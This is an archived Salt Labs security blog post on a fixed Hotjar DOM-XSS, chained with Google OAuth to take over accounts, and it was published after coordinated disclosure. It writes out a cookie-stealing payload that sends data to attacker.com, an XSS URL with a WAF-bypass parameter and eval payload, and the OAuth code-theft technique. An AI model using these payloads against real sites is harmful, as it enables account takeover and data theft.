---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-07-29_over-1-million-websites-are-at-risk-of-sensitive-information-leakage-xss-is-dead.md
original_filename: 2024-07-29_over-1-million-websites-are-at-risk-of-sensitive-information-leakage-xss-is-dead.md
title: Over 1 Million websites are at risk of sensitive information leakage - XSS
  is dead. Long live XSS
category: documents
detected_topics:
- xss
- oauth
- sso
- access-control
- command-injection
- otp
tags:
- imported
- documents
- xss
- oauth
- sso
- access-control
- command-injection
- otp
language: en
raw_sha256: d860664824bd9d6b85dc1ba7bf290039ecd36e97dff7db353961831003d16576
text_sha256: cd3ef2928adbc2f1755ba039ebd2656d0783aa3ecc67decf3e7be57bdd91231e
ingested_at: '2026-06-28T07:32:36Z'
sensitivity: unknown
redactions_applied: false
---

# Over 1 Million websites are at risk of sensitive information leakage - XSS is dead. Long live XSS

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-07-29_over-1-million-websites-are-at-risk-of-sensitive-information-leakage-xss-is-dead.md
- Source Type: markdown
- Detected Topics: xss, oauth, sso, access-control, command-injection, otp
- Ingested At: 2026-06-28T07:32:36Z
- Redactions Applied: False
- Raw SHA256: `d860664824bd9d6b85dc1ba7bf290039ecd36e97dff7db353961831003d16576`
- Text SHA256: `cd3ef2928adbc2f1755ba039ebd2656d0783aa3ecc67decf3e7be57bdd91231e`


## Content

---
title: "Over 1 Million websites are at risk of sensitive information leakage - XSS is dead. Long live XSS"
page_title: "XSS Vulnerability Tied to Hotjar Leaks Sensitive OAuth Data"
url: "https://salt.security/blog/over-1-million-websites-are-at-risk-of-sensitive-information-leakage---xss-is-dead-long-live-xss"
final_url: "https://salt.security/blog/over-1-million-websites-are-at-risk-of-sensitive-information-leakage---xss-is-dead-long-live-xss"
authors: ["Aviad Carmel (@AviadCarmel)"]
programs: ["Hotjar"]
bugs: ["XSS", "OAuth"]
publication_date: "2024-07-29"
added_date: "2024-07-30"
source: "pentester.land/writeups.json"
original_index: 125
---

Salt Labs

# Over 1 Million websites are at risk of sensitive information leakage — XSS is dead. Long live XSS

July 29, 2024

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/68154675c8fd52cf04d62775_AviadCarmel.avif)[Aviad Carmel](/blog-authors/aviad-carmel)

Security Researcher

## Intro

Cross-site scripting (aka XSS) has rightfully claimed its place as one of the most popular web vulnerabilities. Since its first emergence, somewhere in the dark days of the internet, countless vulnerabilities have been found across websites everywhere. Therefore, it comes as no surprise that XSS has been consistently highlighted as a [top risk in the OWASP TOP-10](/blog/owasp-api-security-top-10-explained) since the list's very first iteration in 2004!

Surely, such a high-profile vulnerability must be already addressed and prioritized by everyone — vendors, developers, practitioners, the security community, — and indeed it is.

Throughout the years, many protection layers have been placed to detect XSS and prevent its exploitation. From an attacker's perspective, these protections pose a real challenge. While XSS is still alive and kicking, it has become astronomically more difficult to exploit it successfully than before, which explains why we gradually see fewer instances of it in the wild.

However, similar to many other cases in the cybersecurity ecosystem — sometimes new, seemingly unrelated developments can lead to the reincarnation of old and, at times, forgotten vulnerabilities. In this blog post, we demonstrate why this is exactly the case of XSS when smartly combined with a new emerging technology — OAuth. 

## XSS ♥️ OAuth

What better way to showcase a new attack technique than with real-world examples? This blog post will do just that. While Salt Labs has already found numerous instances where we successfully exploited this issue, we decided to bring to your attention to two very high-profile cases in which the impact could have been very severe had these issues remained unaddressed. This post is the first in a two-part series, where each company will be revealed in a separate post.

As always, every finding we publish here has followed our strict coordinated disclosure policy in order to ensure these specific cases were already addressed, and further exploitation is impossible. In general, we usually look for research targets with a bug-bounty or similar program, as it shows they prioritize security and invite researchers to find vulnerabilities.

## Check if you are vulnerable to XSS and OAuth attacks

[Start 1-Click Free Scanning](https://salt.security/labs/scan)

### XSS History

To start, we will provide some very basic background on XSS and the protections developed for it throughout the years. If this is an area you feel comfortable with, feel free to skip to the Mitigations section.

### The basic 

XSS, in a nutshell, is the ability to run JavaScript (from now on — JS) code on a victim's browser.

Let’s take an example vulnerable website, https://_xss.example.com_ , which outputs your input back to the screen. 

For example, the URL:  
‍`https://xss.example.com/?input=Hello`‍

Will output “Hello” to the screen.

If you write HTML/JS code instead of the input, the browser will think that the code was generated by the backend and parse it as legitimate HTML/JS.

For example, the URL:

`https://xss.example.com/?input=`**`<script>alert(“xss”)</script>`**

Will output “ _< script>alert(‘xss’)</script>_,” which will cause the browser to pop up a message with the text "xss".

It gets interesting when the victim has secret credentials stored in https://_xss.example.com_ , like cookies.  
‍  
In a typical XSS exploit, an attacker can use the following URL to steal those cookies:

`https://xss.example.com/?input=`**`<script>document.location="http://attacker.com/index.php?cookie=" + document.cookie;</script>`**_  
‍  
_ The attacker can send the link from above to other people (victims) through email, social media, or other methods. When a victim clicks on this link, their cookies, including credentials stored in https://_xss.example.com_ , will be passed to the attacker. **This is a full account takeover.**  
‍

And, well… that's about it (or at least that's all the background you need).

### The Mitigations

As we mentioned, throughout the years, numerous XSS protections have been designed. If you are responsible for the security of a website and want to protect against XSS attacks, there are several key strategies that you can implement:

#### 1\. Manual Input Sanitization and Output Encoding 

This is the oldest yet most common mitigation. The developers need to sanitize user inputs and make sure no HTML/JS code that came from an input will be parsed as JS/HTML in the output. This approach puts a lot of responsibility on developers, and in a lot of cases, it’s not trivial to perfectly sanitize the input, and mistakes happen.

#### 2\. Using Modern Web Frameworks

If the website is developed in React, Angular or other similar modern JavaScript frameworks, then it offers strong built-in protections against XSS by automatically escaping any values embedded within JSX out of the box. This automatic escaping effectively prevents them from being executed as HTML or JavaScript. 

#### 3\. HTTP-Only

Besides input sanitization, there is an additional common approach that websites should take - and that is the HTTP-Only feature, which significantly enhances security by preventing access to cookie values via client-side scripts. This attribute ensures that cookies are only sent to the server with HTTP requests, making them inaccessible to JavaScript running in the browser.

In the example of _xss.example.com_ , if HTTP-only was presented, then the following link:

`https://xss.example.com/?input=`**`<script>document.location="http://attacker.com/index.php?cookie=" + document.cookie;</script>`**

will run a javascript code on a victim, but the “document.cookie” method won’t return a sensitive cookie, making it non-exploitable for an attacker. 

#### 4\. CSP

Content Security Policy (CSP) is another common approach, which allows website administrators to specify safe sources for content like scripts and images, effectively blocking malicious scripts injected from unauthorized sources.

While the mitigations we mentioned above are a must, and we encourage every developer to use them, they are not bulletproof and there are still ways for attackers to bypass them.

## XSS ♥️ OAuth ♥️ Hotjar

We’ll begin with the example of Hotjar. A well-known company that serves over one million websites, including global household brands, such as Adobe, Microsoft, Panasonic, Columbia, RyanAir, Decathlon, T-Mobile, Nintendo, and many more. Hotjar is a leading solution for product teams who want to go beyond traditional web and product analytics so they can empathize with and understand their users — to connect the dots between what's happening and why it happens, so they can improve the user experience (UX) and create customer delight.

Due to the nature of the Hotjar solution, like recording user screen and keyboard activity, the data it collects can include a vast volume of personal and sensitive data, such as names, emails, addresses, private messages, banking details, and even credentials under certain circumstances. Whether or not you’ve heard of Hotjar, chances are that you have probably interacted with one of the million websites using its technology, which means it may have collected your data somehow.

Usually, before starting the research, we run our internal automated checks to identify the website's “weak” spots just to get a feeling of what may be interesting from the attacker's perspective. Starting today, we decided to make one of our tools public, so if you are a web owner,[ you can access our tool here.](https://salt.security/labs/scan)

Hotjar is a great example of a modern website that follows all the best practices regarding XSS. Therefore, searching for traditional XSS in the backend is not trivial, and our approach here will differ. 

We downloaded all the JS source files from _https://insights.hotjar.com_ (the main dashboard). This could be trivially done with tools [like this](https://chromewebstore.google.com/detail/resources-saver/nlfcijlhljpenllloeheihmhoobeefpc). 

The most common method for analyzing JS code for vulnerabilities is searching for “Sink functions,” which are JS methods that run arguments as HTML/JS code. For example, methods like “document.InnerHTML”, “document.write” and “document.location”.

[Find more information on DOM-Based XSS](https://medium.com/@fath3ad.22/understanding-dom-based-xss-sources-and-sinks-c17ae4bc7455).

In the case of Hotjar, we tried the reverse strategy of searching for “Sources” — places in the JS code that take input from the user, especially query parameters. For example, take a look at the following code:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/66a682219d55bfabeaedd2ff_66a6821cd2ea4829c21bb1e1_Screenshot%25202024-07-28%2520at%252020.38.23.png)

Assuming the URL takes the form of _https://example.com?name=value_ , this JS code reads “value” from the URL. 

There are various ways to search patterns in a code, but we started with a basic find command for simplicity. The following find command searches for URLSearchParams(window.location.search) in all JS files in Hotjar and prints 50 lines of code for every match:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/66a3714a4365e34cafb90ed8_66a02516990a027dfe71c0a3_Picture3.png)

`find . -name "*.js" -exec grep -H -A 50 "URLSearchParams(window.location.search)" {} + `

We found 24 matches, it’s a total of 24*50 = 1,200 lines to read. 

After reading and checking several matches, the following one caught our eye:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/66a371a9ae3793758468bd79_66a36f1b8b08ea5dedb9cb20_Screenshot%25202024-07-26%2520at%252012.40.25.png)

Besides the `URLSearchParams(window.location.search),`you can notice the function `window.location.replace(e)`below. At this point, it is hard to know the exact flow to this line, and where the parameter is coming from. 

While it’s possible to carefully read the code, running it will be much more effective. Therefore, we used Chrome debugging tools on Hotjar's website, searched for that specific line, and put a breakpoint there.

After both reading the code and running it using Chrome, that’s what the code does:

_If:_

  1. ‍ _“next” param is presented and doesn’t start with “/,”_
  2. ‍ _״fromLMS״ is presented inside the “next” query parameter_
  3. ‍ _returnURL is also presented in the “next” query parameter_
  4. ‍ _then: the javascript code redirects the user to the returnURL using window.location.replace._

Using window.location.replace, you can also run a javascript by using the “URL” javascript:[code], making it possible to trigger the XSS using the following link:

`https://insights.hotjar.com/?next=?fromLMS=1%26returnURL=`**`javascript:alert('Hello XSS')`**`&extraVar=jsvar32312`

Note that the “extraVar” role is simply used for a WAF protection bypass, and is not directly related to the issue at hand. 

### Bypassing HTTP-Only

The go-to exploitation technique would be for attackers to leverage the XSS to read the browser cookies. However, the cookies (at least the important ones) were set with the HTTP-only flag in this case. Thus, it turns out that we cannot read those cookies with JavaScript code, and all classic XSS exploits will not work here.

### OAuth to the rescue

One of the features in Hotjar — and almost any other modern website today — is social login, which is based on OAuth (the open standard for authorization). 

When you connect to Hotjar using Google, Hotjar sends you to Google, Google generates a secret token for you, and you pass the secret back to Hotjar to complete the authentication.

For example, if you click on “Sign in with Google,” Hotjar will redirect you to Google:

`https://accounts.google.com/o/oauth2/v2/auth?response_type=code&client_id=145303889798-f167kpmuqrlh4rd597teoj633et6ku9i.apps.googleusercontent.com&redirect_uri=https://insights.hotjar.com/api/sso/google-auth&scope=openid+email+profile&state=[state]`

and Google will **automatically** (assuming the user already approved Hotjar in Google in the past) redirect you back to Hotjar using the following URL that contains a secret code:

`https://insights.hotjar.com/api/sso/google-auth?state=[state]&`**`code=[secret_code]`**

In other words — the secret code, at the end of the OAuth flow, will be located in the URL — and that’s something that the javascript code can read.

*You can find our [step-by-step explanation](/blog/traveling-with-oauth-account-takeover-on-booking-com) if you want to read more about how OAuth works.

To combine XSS with this new social-login (OAuth) feature and achieve working exploitation, we use a javascript code that starts a new OAuth login flow in a new window and then reads the token from that window:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/66a371a9ae3793758468bd71_66a36f72e71dffc56649550e_Screenshot%25202024-07-26%2520at%252012.42.00.png)

With this method, the javascript code opens a new tab to Google, and Google automatically redirects the user back to https://insights.hotjar.com with the OAuth code in the URL:

`https://insights.hotjar.com/api/sso/google-auth`**`#`**`state=...&`**`code=[secret_code]`**

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/66a371a9ae3793758468bd61_66a36f89a28b0c9f76228e3b_Screenshot%25202024-07-26%2520at%252012.42.22.png)

The JS code reads the URL from the new tab (this is possible because if you have an XSS on a domain in one window, this window can then reach other windows of the same origin) and extracts the OAuth credentials from it.

Note that we changed the original OAuth link to Google — we used the response type “code,token” instead of only “code”, which makes Google send the code in the hash fragment (**#** code=...). This enables us to read the code from the URL and ensure Hotjar doesn’t consume the code, which can be consumed only once. 

Once the attacker has a victim's code, they can start a new login flow in Hotjar but replace their code with the victim code — leading to a full **account takeover**.  
  
To summarize — this is what the malicious link looks like (the javascript code was inserted as a base64 value):  
  
`https://insights.hotjar.com/?next=?fromLMS=1%26returnURL=`**`javascript:eval(atob('CmI9d2luZG93Lm9wZW4oIm…'))`**`&extraVar=jsvar32312` _  
  
‍_ When a victim (Hotjar’s account owner) clicks on this link (which has a **legitimate** domain), their credentials will be passed to an attacker. There are a few potential attack vectors that could be used to get a malicious link to the Hotjar account owner/website administrator. For example, Hotjar has a feedback feature where users write feedback, which the web owner will read.  
  
As we wrote before, the issue was completely fixed, and Hotjar did a great job mitigating it.  

### Impact

As mentioned earlier, HotJar stores user recordings, including keyboard and mouse activities. 

This data includes names, emails, addresses, private messages, bank details, credentials (in specific scenarios), and more. 

In the default settings, HotJar censors data:

![](https://cdn.prod.website-files.com/6334717ca56db62653270dc5/66a3714a4365e34cafb90edc_66a0265da2f3e2d05c75eba6_Picture6.png)

As you can see, in an account takeover scenario, the attacker can change the settings and make most sensitive data available. While in this case, this doesn’t seem to include all types of information (like credit card details, for example), it does include an extensive amount of other sensitive and valuable information. Note that those users include the website’s administrators, which means the attacker can learn additional data regarding the website itself (like the control panel's location) and even leverage it to take over the website, depending on what data was collected. 

## What's next?

**‍** In the next part, we'll explore another well-known company where we've discovered a new (and a little bit different from this current one) method to combine XSS and OAuth. Stay tuned

To learn more about how Salt can help defend your organization from those risks or other API risks, you can [connect with a rep](https://salt.security/contact-us) or schedule a [personalized demo](https://content.salt.security/demo.html). If you're unsure about its relevance to your assets, you can use [Salt Labs' scan](https://salt.security/labs/scan) to check your domain for risks and vulnerabilities for free.

## Disclosure Timeline

We worked through the following timeline in this coordinated disclosure process. Again, we thank Hotjar for taking action to resolve these critical vulnerabilities.

  * Salt Labs discovers the vulnerability in Hotjar: April 17, 2024
  * Hotjar security team deploys mitigation, and Salt Labs confirms exploits are no longer working: April 19, 2024
  * Salt Labs sends Hotjar security team this technical blog detailing the vulnerability: July 19
  * Salt marketing team shares draft of blog and press release with Hotjar marketing team: July 19
  * Salt publishes blog and press release: July 29

## Tags

[Salt Labs](/blog-tags/salt-labs)

[Research](/blog-tags/research)

## Categories

[Customer](/blog-categories/customer)

[Product](/blog-categories/product)

[Industry](/blog-categories/industry)

[Technical](/blog-categories/technical)

[Company](/blog-categories/company)

[Salt Labs](/blog-categories/salt-labs)

## Salt Security Blog

Sign up for the Salt Newsletter for the latest resources and blog posts.

## Our latest posts

[IndustryWe Trained Cybersecurity Startups to Win POVs, Not Solve ProblemsRoey Eliyahu | June 22, 2026If agents are connected to APIs, attackers can use them to explore and exploit weak authorization paths faster. The API vulnerability was already serious. Agentic access makes it scalable.Read more](/blog/we-trained-cybersecurity-startups-to-win-povs-not-solve-problems)

[IndustryDeconstructing the Agentic Stack: Why API Visibility Is the Ultimate Defense for AI AgentsRoy Bar Yosef | June 11, 2026Organizations are rushing to deploy AI agents, but many still lack a clear view of what those agents can access, which tools they can call, and which APIs they can trigger.Read more](/blog/deconstructing-the-agentic-stack-why-api-visibility-is-the-ultimate-defense-for-ai-agents)

[IndustryEveryone Is Buying AI Guardrails. But Agents Have the Keys to the Car.Roey Eliyahu | June 8, 2026The first wave of AI security was necessary. It gave us guardrails for prompts, models, and outputs. But agents changed the security question.Read more](/blog/everyone-is-buying-ai-guardrails-but-agents-have-the-keys-to-the-car)
